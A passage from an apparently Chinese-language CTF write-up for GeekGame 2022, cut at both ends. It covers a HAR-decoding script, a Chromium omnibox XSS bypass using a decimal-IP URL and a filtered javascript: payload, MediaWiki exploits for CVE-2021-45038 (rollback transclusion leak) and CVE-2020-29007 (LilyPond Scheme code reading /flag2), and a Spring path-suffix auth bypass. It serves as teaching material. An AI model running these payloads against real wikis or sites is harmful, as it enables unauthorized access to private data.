class="nl">"2"</span><span class="p">:[</span><span class="mi">1</span><span class="p">,</span><span class="s2">"a"</span><span class="p">],</span><span class="nl">"3"</span><span class="p">:</span><span class="mi">1</span><span class="p">}</span><span class="err">,</span><span class="nl">"43"</span><span class="p">:{</span><span class="nl">"0"</span><span class="p">:</span><span class="mi">5</span><span class="p">,</span><span class="nl">"2"</span><span class="p">:[</span><span class="mi">1</span><span class="p">,</span><span class="s2">"t"</span><span class="p">],</span><span class="nl">"3"</span><span class="p">:</span><span class="mi">1</span><span class="p">}</span><span class="err">,</span><span class="nl">"44"</span><span class="p">:{</span><span class="nl">"0"</span><span class="p">:</span><span class="mi">5</span><span class="p">,</span><span class="nl">"2"</span><span class="p">:[</span><span class="mi">1</span><span class="p">,</span><span class="s2">"e"</span><span class="p">],</span><span class="nl">"3"</span><span class="p">:</span><span class="mi">1</span><span class="p">}</span><span class="err">,</span><span class="nl">"45"</span><span class="p">:{</span><span class="nl">"0"</span><span class="p">:</span><span class="mi">5</span><span class="p">,</span><span class="nl">"2"</span><span class="p">:[</span><span class="mi">1</span><span class="p">,</span><span class="s2">"/"</span><span class="p">],</span><span class="nl">"3"</span><span class="p">:</span><span class="mi">1</span><span class="p">}</span><span class="err">,</span><span class="nl">"46"</span><span class="p">:{</span><span class="nl">"0"</span><span class="p">:</span><span class="mi">5</span><span class="p">,</span><span class="nl">"2"</span><span class="p">:[</span><span class="mi">1</span><span class="p">,</span><span class="s2">"p"</span><span class="p">],</span><span class="nl">"3"</span><span class="p">:</span><span class="mi">1</span><span class="p">}</span><span class="err">,</span><span class="nl">"47"</span><span class="p">:{</span><span class="nl">"0"</span><span class="p">:</span><span class="mi">5</span><span class="p">,</span><span class="nl">"2"</span><span class="p">:[</span><span class="mi">1</span><span class="p">,</span><span class="s2">"r"</span><span class="p">],</span><span class="nl">"3"</span><span class="p">:</span><span class="mi">1</span><span class="p">}</span><span class="err">,</span><span class="nl">"48"</span><span class="p">:{</span><span class="nl">"0"</span><span class="p">:</span><span class="mi">5</span><span class="p">,</span><span class="nl">"2"</span><span class="p">:[</span><span class="mi">1</span><span class="p">,</span><span class="s2">"o"</span><span class="p">],</span><span class="nl">"3"</span><span class="p">:</span><span class="mi">1</span><span class="p">}</span><span class="err">,</span><span class="nl">"49"</span><span class="p">:{</span><span class="nl">"0"</span><span class="p">:</span><span class="mi">5</span><span class="p">,</span><span class="nl">"2"</span><span class="p">:[</span><span class="mi">1</span><span class="p">,</span><span class="s2">"b"</span><span class="p">],</span><span class="nl">"3"</span><span class="p">:</span><span class="mi">1</span><span class="p">}</span><span class="err">,</span><span class="nl">"50"</span><span class="p">:{</span><span class="nl">"0"</span><span class="p">:</span><span class="mi">5</span><span class="p">,</span><span class="nl">"2"</span><span class="p">:[</span><span class="mi">1</span><span class="p">,</span><span class="s2">"_"</span><span class="p">],</span><span class="nl">"3"</span><span class="p">:</span><span class="mi">1</span><span class="p">}</span><span class="err">,</span><span class="nl">"51"</span><span class="p">:{</span><span class="nl">"0"</span><span class="p">:</span><span class="mi">5</span><span class="p">,</span><span class="nl">"2"</span><span class="p">:[</span><span class="mi">1</span><span class="p">,</span><span class="s2">"k"</span><span class="p">],</span><span class="nl">"3"</span><span class="p">:</span><span class="mi">1</span><span class="p">}</span><span class="err">,</span><span class="nl">"52"</span><span class="p">:{</span><span class="nl">"0"</span><span class="p">:</span><span class="mi">5</span><span class="p">,</span><span class="nl">"2"</span><span class="p">:[</span><span class="mi">1</span><span class="p">,</span><span class="s2">"A"</span><span class="p">],</span><span class="nl">"3"</span><span class="p">:</span><span class="mi">1</span><span class="p">}</span><span class="err">,</span><span class="nl">"53"</span><span class="p">:{</span><span class="nl">"0"</span><span class="p">:</span><span class="mi">5</span><span class="p">,</span><span class="nl">"2"</span><span class="p">:[</span><span class="mi">1</span><span class="p">,</span><span class="s2">"i"</span><span class="p">],</span><span class="nl">"3"</span><span class="p">:</span><span class="mi">1</span><span class="p">}</span><span class="err">,</span><span class="nl">"54"</span><span class="p">:{</span><span class="nl">"0"</span><span class="p">:</span><span class="mi">5</span><span class="p">,</span><span class="nl">"2"</span><span class="p">:[</span><span class="mi">1</span><span class="p">,</span><span class="s2">"Q"</span><span class="p">],</span><span class="nl">"3"</span><span class="p">:</span><span class="mi">1</span><span class="p">}</span><span class="err">,</span><span class="nl">"55"</span><span class="p">:{</span><span class="nl">"0"</span><span class="p">:</span><span class="mi">5</span><span class="p">,</span><span class="nl">"2"</span><span class="p">:[</span><span class="mi">1</span><span class="p">,</span><span class="s2">"c"</span><span class="p">],</span><span class="nl">"3"</span><span class="p">:</span><span class="mi">1</span><span class="p">}</span><span class="err">,</span><span class="nl">"56"</span><span class="p">:{</span><span class="nl">"0"</span><span class="p">:</span><span class="mi">5</span><span class="p">,</span><span class="nl">"2"</span><span class="p">:[</span><span class="mi">1</span><span class="p">,</span><span class="s2">"W"</span><span class="p">],</span><span class="nl">"3"</span><span class="p">:</span><span class="mi">1</span><span class="p">}</span><span class="err">,</span><span class="nl">"57"</span><span class="p">:{</span><span class="nl">"0"</span><span class="p">:</span><span class="mi">5</span><span class="p">,</span><span class="nl">"2"</span><span class="p">:[</span><span class="mi">1</span><span class="p">,</span><span class="s2">"H"</span><span class="p">],</span><span class="nl">"3"</span><span class="p">:</span><span class="mi">1</span><span class="p">}</span><span class="err">,</span><span class="nl">"58"</span><span class="p">:{</span><span class="nl">"0"</span><span class="p">:</span><span class="mi">5</span><span class="p">,</span><span class="nl">"2"</span><span class="p">:[</span><span class="mi">1</span><span class="p">,</span><span class="s2">"o"</span><span class="p">],</span><span class="nl">"3"</span><span class="p">:</span><span class="mi">1</span><span class="p">}</span><span class="err">,</span><span class="nl">"59"</span><span class="p">:{</span><span class="nl">"0"</span><span class="p">:</span><span class="mi">5</span><span class="p">,</span><span class="nl">"2"</span><span class="p">:[</span><span class="mi">1</span><span class="p">,</span><span class="s2">"b"</span><span class="p">],</span><span class="nl">"3"</span><span class="p">:</span><span class="mi">1</span><span class="p">}</span><span class="err">,</span><span class="nl">"60"</span><span class="p">:{</span><span class="nl">"0"</span><span class="p">:</span><span class="mi">5</span><span class="p">,</span><span class="nl">"2"</span><span class="p">:[</span><span class="mi">1</span><span class="p">,</span><span class="s2">"s"</span><span class="p">],</span><span class="nl">"3"</span><span class="p">:</span><span class="mi">1</span><span class="p">}</span><span class="err">,</span><span class="nl">"61"</span><span class="p">:{</span><span class="nl">"0"</span><span class="p">:</span><span class="mi">5</span><span class="p">,</span><span class="nl">"2"</span><span class="p">:[</span><span class="mi">1</span><span class="p">,</span><span class="s2">"B"</span><span class="p">],</span><span class="nl">"3"</span><span class="p">:</span><span class="mi">1</span><span class="p">}</span><span class="err">,</span><span class="nl">"62"</span><span class="p">:{</span><span class="nl">"0"</span><span class="p">:</span><span class="mi">5</span><span class="p">,</span><span class="nl">"2"</span><span class="p">:[</span><span class="mi">1</span><span class="p">,</span><span class="s2">"z"</span><span class="p">],</span><span class="nl">"3"</span><span class="p">:</span><span class="mi">1</span><span class="p">}</span><span class="err">,</span><span class="nl">"63"</span><span class="p">:{</span><span class="nl">"0"</span><span class="p">:</span><span class="mi">5</span><span class="p">,</span><span class="nl">"2"</span><span class="p">:[</span><span class="mi">1</span><span class="p">,</span><span class="s2">"R"</span><span class="p">],</span><span class="nl">"3"</span><span class="p">:</span><span class="mi">1</span><span class="p">}</span><span class="err">,</span><span class="nl">"64"</span><span class="p">:{</span><span class="nl">"0"</span><span class="p">:</span><span class="mi">5</span><span class="p">,</span><span class="nl">"2"</span><span class="p">:[</span><span class="mi">1</span><span class="p">,</span><span class="s2">"J"</span><span class="p">],</span><span class="nl">"3"</span><span class="p">:</span><span class="mi">1</span><span class="p">}</span><span class="err">,</span><span class="nl">"65"</span><span class="p">:{</span><span class="nl">"0"</span><span class="p">:</span><span class="mi">5</span><span class="p">,</span><span class="nl">"2"</span><span class="p">:[</span><span class="mi">1</span><span class="p">,</span><span class="s2">"E"</span><span class="p">],</span><span class="nl">"3"</span><span class="p">:</span><span class="mi">1</span><span class="p">}</span><span class="err">,</span><span class="nl">"66"</span><span class="p">:{</span><span class="nl">"0"</span><span class="p">:</span><span class="mi">5</span><span class="p">,</span><span class="nl">"2"</span><span class="p">:[</span><span class="mi">1</span><span class="p">,</span><span class="s2">"s"</span><span class="p">],</span><span class="nl">"3"</span><span class="p">:</span><span class="mi">1</span><span class="p">}</span><span class="err">,</span><span class="nl">"67"</span><span class="p">:{</span><span class="nl">"0"</span><span class="p">:</span><span class="mi">5</span><span class="p">,</span><span class="nl">"2"</span><span class="p">:[</span><span class="mi">1</span><span class="p">,</span><span class="s2">"_"</span><span class="p">],</span><span class="nl">"3"</span><span class="p">:</span><span class="mi">1</span><span class="p">}</span><span class="err">,</span><span class="nl">"68"</span><span class="p">:{</span><span class="nl">"0"</span><span class="p">:</span><span class="mi">5</span><span class="p">,</span><span class="nl">"2"</span><span class="p">:[</span><span class="mi">1</span><span class="p">,</span><span class="s2">"n"</span><span class="p">],</span><span class="nl">"3"</span><span class="p">:</span><span class="mi">1</span><span class="p">}</span><span class="err">,</span><span class="nl">"69"</span><span class="p">:{</span><span class="nl">"0"</span><span class="p">:</span><span class="mi">5</span><span class="p">,</span><span class="nl">"2"</span><span class="p">:[</span><span class="mi">1</span><span class="p">,</span><span class="s2">"e"</span><span class="p">],</span><span class="nl">"3"</span><span class="p">:</span><span class="mi">1</span><span class="p">}</span><span class="err">,</span><span class="nl">"70"</span><span class="p">:{</span><span class="nl">"0"</span><span class="p">:</span><span class="mi">5</span><span class="p">,</span><span class="nl">"2"</span><span class="p">:[</span><span class="mi">1</span><span class="p">,</span><span class="s2">"x"</span><span class="p">],</span><span class="nl">"3"</span><span class="p">:</span><span class="mi">1</span><span class="p">}</span><span class="err">,</span><span class="nl">"71"</span><span class="p">:{</span><span class="nl">"0"</span><span class="p">:</span><span class="mi">5</span><span class="p">,</span><span class="nl">"2"</span><span class="p">:[</span><span class="mi">1</span><span class="p">,</span><span class="s2">"t"</span><span class="p">],</span><span class="nl">"3"</span><span class="p">:</span><span class="mi">1</span><span class="p">}</span><span class="err">,</span><span class="nl">"72"</span><span class="p">:{</span><span class="nl">"0"</span><span class="p">:</span><span class="mi">133</span><span class="p">,</span><span class="nl">"2"</span><span class="p">:[</span><span class="mi">1</span><span class="p">,</span><span class="s2">"机密flag链接已经受到保护，只允许出题人访问"</span><span class="p">],</span><span class="nl">"3"</span><span class="p">:</span><span class="mi">2</span><span class="p">,</span><span class="nl">"8"</span><span class="p">:[[</span><span class="mi">0</span><span class="p">,{</span><span class="nl">"0"</span><span class="p">:</span><span class="s2">"#000000"</span><span class="p">,</span><span class="nl">"1"</span><span class="p">:</span><span class="s2">""</span><span class="p">,</span><span class="nl">"2"</span><span class="p">:</span><span class="mi">10</span><span class="p">,</span><span class="nl">"3"</span><span class="p">:</span><span class="mi">0</span><span class="p">,</span><span class="nl">"4"</span><span class="p">:</span><span class="mi">0</span><span class="p">,</span><span class="nl">"5"</span><span class="p">:</span><span class="mi">0</span><span class="p">}]]}}</span><span class="w">
</span></code></pre></div></div>

<p>就能拼出 URL 了。第二关的 har 用 Chromium 的开发者工具导入，然后也是把 sheet 请求拿出来，写个程序肉眼 OCR：</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="nn">json</span>

<span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s">"test.json"</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
    <span class="n">data</span> <span class="o">=</span> <span class="n">json</span><span class="p">.</span><span class="n">load</span><span class="p">(</span><span class="n">f</span><span class="p">)</span>

<span class="n">grid</span> <span class="o">=</span> <span class="p">[[</span><span class="s">" "</span> <span class="k">for</span> <span class="n">_</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">11</span><span class="p">)]</span> <span class="k">for</span> <span class="n">_</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">300</span><span class="p">)]</span>

<span class="k">for</span> <span class="n">key</span> <span class="ow">in</span> <span class="n">data</span><span class="p">:</span>
    <span class="n">loc</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">key</span><span class="p">)</span>
    <span class="n">x</span> <span class="o">=</span> <span class="n">loc</span> <span class="o">%</span> <span class="mi">11</span>
    <span class="n">y</span> <span class="o">=</span> <span class="n">loc</span> <span class="o">//</span> <span class="mi">11</span>
    <span class="n">grid</span><span class="p">[</span><span class="n">y</span><span class="p">][</span><span class="n">x</span><span class="p">]</span> <span class="o">=</span> <span class="s">'x'</span>

<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">300</span><span class="p">):</span>
    <span class="k">for</span> <span class="n">j</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">11</span><span class="p">):</span>
        <span class="k">print</span><span class="p">(</span><span class="n">grid</span><span class="p">[</span><span class="n">i</span><span class="p">][</span><span class="n">j</span><span class="p">],</span> <span class="n">end</span><span class="o">=</span><span class="s">''</span><span class="p">)</span>
    <span class="k">print</span><span class="p">(</span><span class="s">""</span><span class="p">)</span>
</code></pre></div></div>

<p>做出来之后问了一下 xmcp，看起来我刚好选择了正确的请求来解析（页面有两个请求，对应两个不同的历史记录版本）</p>

<h2 id="给钱不要">给钱不要！</h2>

<p>很硬核的 XSS（？）题。我被 Chromium omnibox 折磨了很久。</p>

<h3 id="flag-1特别安全地-vivo50">Flag 1：特别安全地 vivo50</h3>

<p>网页的逻辑只有：</p>

<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">function</span> <span class="nx">go</span><span class="p">()</span> <span class="p">{</span>
    <span class="nx">location</span><span class="p">.</span><span class="nx">href</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nx">getElementById</span><span class="p">(</span><span class="dl">'</span><span class="s1">filename</span><span class="dl">'</span><span class="p">).</span><span class="nx">value</span> <span class="o">+</span> <span class="dl">'</span><span class="s1">.jpg</span><span class="dl">'</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div>

<p>其中 <code class="language-plaintext highlighter-rouge">filename</code> 是我们可以控制的。我一开始看到的时候，想，要跳转到自己的网站显示自定义 title 的话那不是很简单吗，”https://example.com/example/#.jpg” 嘛。</p>

<p>然而，我们有一个坏消息和一个好消息：</p>

<ul>
  <li>坏消息：chrome://omnibox 会检查你的输入，flag1 需要类型为 query 才会通过；</li>
  <li>好消息：脚本会帮我们把 HTTP(S) 的 scheme 去掉。</li>
</ul>

<p>在多次尝试无果后，我去找了 Chromium 的源代码。<a href="https://github.com/chromium/chromium/blob/main/components/omnibox/browser/autocomplete_input_unittest.cc">https://github.com/chromium/chromium/blob/main/components/omnibox/browser/autocomplete_input_unittest.cc</a> 提供了很多测试样例，而具体逻辑在 <a href="https://github.com/chromium/chromium/blob/main/components/omnibox/browser/autocomplete_input.cc">https://github.com/chromium/chromium/blob/main/components/omnibox/browser/autocomplete_input.cc</a>。</p>

<p>可以注意到，<code class="language-plaintext highlighter-rouge">user@foo</code> 的结果是 UNKNOWN，因此 <code class="language-plaintext highlighter-rouge">vivo50@taoky.moe#</code> 的结果也是 UNKNOWN（而不是 URL，毕竟这玩意看起来真的挺像邮箱的，虽然它也可以解释成用 vivo50 用户的身份访问 taoky.moe 就是）</p>

<p>但是，flag1 需要 very_safe (query) 类型。读了测试样例没找到灵感，因此被迫把 autocomplete_input.cc 整个读一遍。</p>

<p>然后我看到了：</p>

<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// Unfortunately, since we called CanonicalizeHost() on the</span>
<span class="c1">// already-canonicalized host, all of these cases will have been changed</span>
<span class="c1">// to have four components (e.g. 13.2 -&gt; 13.0.0.2), so we have to call</span>
<span class="c1">// CanonicalizeHost() again, this time on the original input, so that we</span>
<span class="c1">// can get the correct number of IP components.</span>
</code></pre></div></div>

<p>试了一下，<code class="language-plaintext highlighter-rouge">13.2</code> 的类型真的是 query，但是这个看起来对 IP 要求有点苛刻呀，毕竟第三位是 0 的 IP 不好找。但是这提供了一个方向。说到这种 IP，我的第一反应是：</p>

<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">&gt;</span><span class="w"> </span>ping 114514
<span class="go">PING 114514 (0.1.191.82) 56(84) bytes of data.
</span></code></pre></div></div>

<p>这里，114514（咳！）是 0.1.191.82 的十进制表示，而且看起来是 query，那么把我的 VPS 的 IP（<strong>以下只是以 114.5.1.4 为例子</strong>，实际的 IP 当然不是这个）转换成十进制就行？（我用的工具是 <a href="https://www.browserling.com/tools/ip-to-dec">https://www.browserling.com/tools/ip-to-dec</a>）</p>

<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">&gt;</span><span class="w"> </span>ping 1912930564
<span class="go">PING 1912930564 (114.5.1.4) 56(84) bytes of data.
</span></code></pre></div></div>

<p>不幸的是，omnibox 似乎看出了这个阴谋，返回的类型是 unknown。读了一下 Wikipedia，看到了这句话：</p>

<blockquote>
  <p>When fewer than four numbers are specified in the address in dotted notation, the last value is treated as an integer of as many bytes as are required to fill out the address to four octets. Thus, the address 127.65530 is equivalent to 127.0.255.250.</p>
</blockquote>

<p>诶所以第三位不一定要是 0？我们试一下：</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">&gt;</span> <span class="n">python</span>
<span class="n">Python</span> <span class="mf">3.10</span><span class="p">.</span><span class="mi">8</span> <span class="p">(</span><span class="n">main</span><span class="p">,</span> <span class="n">Nov</span>  <span class="mi">1</span> <span class="mi">2022</span><span class="p">,</span> <span class="mi">14</span><span class="p">:</span><span class="mi">18</span><span class="p">:</span><span class="mi">21</span><span class="p">)</span> <span class="p">[</span><span class="n">GCC</span> <span class="mf">12.2</span><span class="p">.</span><span class="mi">0</span><span class="p">]</span> <span class="n">on</span> <span class="n">linux</span>
<span class="n">Type</span> <span class="s">"help"</span><span class="p">,</span> <span class="s">"copyright"</span><span class="p">,</span> <span class="s">"credits"</span> <span class="ow">or</span> <span class="s">"license"</span> <span class="k">for</span> <span class="n">more</span> <span class="n">information</span><span class="p">.</span>
<span class="o">&gt;&gt;&gt;</span> <span class="mi">4</span><span class="o">+</span><span class="mi">1</span><span class="o">*</span><span class="mi">256</span><span class="o">+</span><span class="mi">5</span><span class="o">*</span><span class="mi">256</span><span class="o">*</span><span class="mi">256</span>
<span class="mi">327940</span>
<span class="o">&gt;&gt;&gt;</span> 
<span class="o">&gt;</span> <span class="n">ping</span> <span class="mf">114.327940</span>
<span class="n">PING</span> <span class="mf">114.327940</span> <span class="p">(</span><span class="mf">114.5</span><span class="p">.</span><span class="mf">1.4</span><span class="p">)</span> <span class="mi">56</span><span class="p">(</span><span class="mi">84</span><span class="p">)</span> <span class="nb">bytes</span> <span class="n">of</span> <span class="n">data</span><span class="p">.</span>
</code></pre></div></div>

<p>并且 omnibox 认为这是个 query，甚至加上 <code class="language-plaintext highlighter-rouge">:</code> 和 <code class="language-plaintext highlighter-rouge">#</code> 都没事。微调一下，我最后的 payload 为：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://114.327940:19198#
</code></pre></div></div>

<p>在 VPS 的 19198 端口开个 http 服务返回指定的 HTML 即可。</p>

<p>（话说我特地去 DNS 里面加了个 vivo50.taoky.moe 不过最后看起来没法用的样子）</p>

<h3 id="flag-2安全地执行-javascript">Flag 2：安全地执行 JavaScript</h3>

<p>这道题要求在网页上跑 JS，限制放宽到不是识别成 URL 就行。首先我可能得为我<a href="https://blog.taoky.moe/2021-11-21/geekgame-v1-wp.html#q%E5%B0%8F%E6%A0%91%E6%B4%9E%E7%9A%84%E4%B8%80%E5%A4%A7%E6%AD%A5">去年写的东西</a>道歉，因为这道题就是用 javascript: 伪协议。</p>

<p>阅读源码，找到了关键的正则（<a href="https://github.com/chromium/chromium/blob/main/components/omnibox/browser/autocomplete_input.cc#L308">https://github.com/chromium/chromium/blob/main/components/omnibox/browser/autocomplete_input.cc#L308</a>）：</p>

<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// Treat javascript: scheme queries followed by things that are unlikely to</span>
<span class="c1">// be code as UNKNOWN, rather than script to execute (URL).</span>
<span class="k">if</span> <span class="p">(</span><span class="n">base</span><span class="o">::</span><span class="n">EqualsCaseInsensitiveASCII</span><span class="p">(</span><span class="n">parsed_scheme_utf8</span><span class="p">,</span>
                                    <span class="n">url</span><span class="o">::</span><span class="n">kJavaScriptScheme</span><span class="p">)</span> <span class="o">&amp;&amp;</span>
   <span class="n">RE2</span><span class="o">::</span><span class="n">FullMatch</span><span class="p">(</span><span class="n">base</span><span class="o">::</span><span class="n">UTF16ToUTF8</span><span class="p">(</span><span class="n">text</span><span class="p">),</span> <span class="s">"(?i)javascript:([^;=().</span><span class="se">\"</span><span class="s">]*)"</span><span class="p">))</span> <span class="p">{</span>
   <span class="k">return</span> <span class="n">metrics</span><span class="o">::</span><span class="n">OmniboxInputType</span><span class="o">::</span><span class="n">UNKNOWN</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div>

<p>也就是说，我们的 js 不能有分号、等号、小括号、点和双引号。这个不难（相比于后面那道 nodejs 绕过的来说）：</p>

<ul>
  <li>点可以用中括号 + 字符串绕过，即 <code class="language-plaintext highlighter-rouge">document.title</code> 和 <code class="language-plaintext highlighter-rouge">document['title']</code> 是等价的。</li>
  <li>等于号怎么绕过呢？我的做法是用模板字符串，即 <code class="language-plaintext highlighter-rouge">`${'\x3d'}`</code> 的结果为 <code class="language-plaintext highlighter-rouge">'='</code>。</li>
  <li>但是最后这样生成出来的是个字符串。小括号用不了，但是我们可以用反引号来作为 eval 的参数，具体来讲，就是 <code class="language-plaintext highlighter-rouge">eval['call']`${'你的 payload'}`</code>
</li>
</ul>

<p>最后的 payload 为 <code class="language-plaintext highlighter-rouge">javascript:eval['call']`${'document[\'title\']\x3ddocument[\'body\'][\'textContent\']'}`</code>，于是从脚本输出的标题里就能看到 flag 了。</p>

<h2 id="私有笔记">私有笔记</h2>

<p>看起来是 2020 年存在的，MediaWiki 的漏洞。搜了一下，看到了一些有意义的内容：</p>

<ul>
  <li>CVE-2020-29007 <a href="https://seqred.pl/en/cve-2020-29007-remote-code-execution-in-mediawiki-score/">https://seqred.pl/en/cve-2020-29007-remote-code-execution-in-mediawiki-score/</a>，似乎这个 MediaWiki 实例用了有问题的 Score。</li>
  <li>CVE-2021-44858, CVE-2021-45038, CVE-2021-44857 <a href="https://www.mediawiki.org/wiki/2021-12_security_release/FAQ">https://www.mediawiki.org/wiki/2021-12_security_release/FAQ</a>，看起来还挺严重的，并且可以让未授权的用户读取到私有的 page。</li>
</ul>

<h3 id="知识与你分享">知识，与你分享</h3>

<p>去 phabricator 逛了逛，读了 <a href="https://phabricator.wikimedia.org/rMW82b5dd2803ac6a026103df8b8421a573c7426239">https://phabricator.wikimedia.org/rMW82b5dd2803ac6a026103df8b8421a573c7426239</a></p>

<blockquote>
  <p>SECURITY: Fix permissions check in action=rollback (CVE-2021-45038)</p>

  <p>Because RollbackAction (as of 0a8403271109) overrided
FormAction::show(), it was no longer checking that the user had the
“rollback” userright. This restores that check, so people without the
“rollback” right will not be able to even get to the rollback form.</p>

  <p>Then escape the user-supplied “from” parameter so it can’t be used to
reveal the contents of other pages through transclusion, e.g.
“{{:Secret}}”. wfEscapeWikiText() is also good practice for &gt; usernames in
general, as they can contain markup like bullets or single quotes &gt; that
affect output.</p>
</blockquote>

<p>似乎可以执行任意模板命令？于是 payload 就是：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>https://prob07-&lt;id&gt;.geekgame.pku.edu.cn/index.php?title=%E9%A6%96%E9%A1%B5&amp;action=rollback&amp;from={{:Flag}}
</code></pre></div></div>

<p><img src="/pictures/geekgame-2022/mediawiki-1.png" alt="MediaWiki rollback CVE"></p>

<p>获得了 flag1 以及登录的凭据。</p>

<h3 id="来我家做客吧">来我家做客吧</h3>

<p><img src="/pictures/geekgame-2022/home.jpg" alt='"To your home"'></p>

<p><em>《孤独摇滚》动画第 7 集「到你的家里」</em></p>

<p>接下来就应该是用 Score 的 RCE 漏洞了，照例读了一下 phabricator（<a href="https://phabricator.wikimedia.org/T257062">https://phabricator.wikimedia.org/T257062</a>），然后简单试了试：</p>

<pre><code class="language-mediawiki">&lt;score lang="lilypond"&gt;\new Staff &lt;&lt;{c^#
(if (file-exists? "/flag") "true" "false")
}&gt;&gt;&lt;/score&gt;
</code></pre>

<p>（payload 需要微调，因为好像没有 Image frame，但是不是大问题）</p>

<p><img src="/pictures/geekgame-2022/lilypond-0.png" alt="No /flag file"></p>

<p>看起来不在 /flag？那 /flag2 呢？</p>

<p><img src="/pictures/geekgame-2022/lilypond-1.png" alt="/flag2 file"></p>

<p>好，那就一定是要读取 /flag2 文件。读了一下资料，感觉 RCE 并且将结果输出出来还是稍微有点难，于是思路转变到用 Scheme (Guile) 来读文件并且输出。</p>

<p>搜索一下可以知道，能用 <code class="language-plaintext highlighter-rouge">open-input-file</code> 开文件，然后读文件可以用 <code class="language-plaintext highlighter-rouge">read-line</code>，但是 <a href="https://stackoverflow.com/questions/44144124/read-a-line-from-a-file"><code class="language-plaintext highlighter-rouge">read-line</code> 需要加载 <code class="language-plaintext highlighter-rouge">ice-9 rdelim</code> 模块</a>。于是代码大概就是：</p>

<div class="language-scheme highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">(</span><span class="nf">use-modules</span> <span class="p">(</span><span class="nf">ice-9</span> <span class="nv">rdelim</span><span class="p">))</span>
<span class="p">(</span><span class="nf">object-&gt;string</span><span class="p">(</span><span class="nf">read-line</span> <span class="p">(</span><span class="nb">open-input-file</span> <span class="s">"/flag2"</span><span class="p">)))</span>
</code></pre></div></div>

<p>我也看了 lilypond 的文档，发现<a href="https://lilypond.org/doc/v2.21/Documentation/extending-big-page#lilypond-scheme-syntax">可以用 <code class="language-plaintext highlighter-rouge">(begin</code> 来弄多行的代码</a>：</p>

<div class="language-scheme highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">(</span><span class="k">begin</span>
<span class="p">(</span><span class="nf">use-modules</span> <span class="p">(</span><span class="nf">ice-9</span> <span class="nv">rdelim</span><span class="p">))</span>
<span class="p">(</span><span class="nf">object-&gt;string</span><span class="p">(</span><span class="nf">read-line</span> <span class="p">(</span><span class="nb">open-input-file</span> <span class="s">"/flag2"</span><span class="p">)))</span>
<span class="p">)</span>
</code></pre></div></div>

<p>于是 payload 就是：</p>

<pre><code class="language-mediawiki">&lt;score lang="lilypond"&gt;\new Staff &lt;&lt;{c^#(begin
(use-modules (ice-9 rdelim))
(object-&gt;string(read-line (open-input-file "/flag2")))
)
}&gt;&gt;&lt;/score&gt;
</code></pre>

<p><img src="/pictures/geekgame-2022/lilypond-2.png" alt="Lilypond Read /flag2"></p>

<p>这个 C3 音高的四分音符 <del>太好听了，简直就是天籁。</del></p>

<h2 id="企业级理解">企业级理解</h2>

<p>这题感觉总体挺迷的，和 GeekGame 其他题目画风区别有点大（就是那种无法理解这玩意儿是要干啥的感觉，我不喜欢这样的题目）。</p>

<h3 id="赋能管理后台">赋能管理后台</h3>

<p>从来没写过 Java web 程序，搜了一下，读到了 <a href="https://www.cnblogs.com/nice0e3/p/16798843.html#antmatchers-%E9%85%8D%E7%BD%AE%E8%AE%A4%E8%AF%81%E7%BB%95%E8%BF%87">https://www.cnblogs.com/nice0e3/p/16798843.html#antmatchers-%E9%85%8D%E7%BD%AE%E8%AE%A4%E8%AF%81%E7%BB%95%E8%BF%87</a>。</p>

<p>所以看起来后面加个 <code class="language-plaintext highlighter-rouge">/</code> 就能绕过权限检查。然后在进入的 admin/ 页面里面发个请求，F12 里面 copy as cURL，<code class="language-plaintext highlighter-rouge">query</code> 后面加个 <code class="language-plaintext highlighter-rouge">/</code>，type 选 “PKU_GeekGame” 就是 flag1</p>

<h3 id="盘活业务增长">盘活业务增长</h3>

<p>我们也可以用同样的方式拿到源代码：</p>

<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="nn">org.springframework.web.reactive.function.client.WebClient</span><span class="o">;</span>

<span class="nd">@RestController</span>
<span class="kd">public</span> <span class="kd">class</span> <span class="nc">AdminController</span> <span class="o">{</span>

    <span class="nc">WebClient</span> <span class="n">webClient</span> <span class="o">=</span> <span class="nc">WebClient</span><span class="o">.</span><span class="na">builder</span><span class="o">().</span><span class="na">baseUrl</span><span class="o">(</span><span class="s">"http://localhost:8079/"</span><span class="o">).</span><span class="na">build</span><span class="o">();</span>

    <span class="nd">@RequestMapping</span><span class="o">(</span><span class="s">"/admin/{index}"</span><span class="o">)</span>
    <span class="kd">public</span> <span class="nc">String</span> <span class="nf">adminIndex</span><span class="o">(</span><span class="nd">@PathVariable</span><span class="o">(</span><span class="n">name</span><span class="o">=</span><span class="s">"index"</span><span class="o">)</span> <span class="nc">String</span> <span class="n">index</span><span class="o">,</span> <span class="nc">String</span> <span class="n">auth</span><span class="o">,</span> <span class="nc">QueryBean</span> <span class="n">queryBean</span><span class="o">)</span> <span class="o">{</span>
        <span class="k">if</span> <span class="o">(</span><span class="n">index</span> <span class="o">!=</span> <span class="kc">null</span> <span class="o">&amp;</span> <span class="n">index</span><span class="o">.</span><span class="na">contains</span><span class="o">(</span><span class="s">"%"</span><span class="o">))</span> <span class="o">{</span>
